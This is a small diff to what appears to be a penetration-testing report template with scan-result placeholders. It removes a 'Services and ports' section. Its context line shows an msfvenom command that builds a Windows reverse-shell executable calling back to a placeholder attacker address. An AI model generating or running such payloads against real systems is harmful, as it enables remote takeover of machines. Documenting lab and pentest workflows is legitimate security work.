@@ -7,9 +7,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shel
 - Server:
 - Workgroup:
 - Windows domain:
-- Services and ports:
-
-INSERTTCPSCAN
 
 ### Full TCP Scan
 
@@ -20,7 +17,6 @@ INSERTFULLTCPSCAN
 INSERTUDPSCAN
 
 ### Vuln Scan
-
 INSERTVULNSCAN
 
 ```
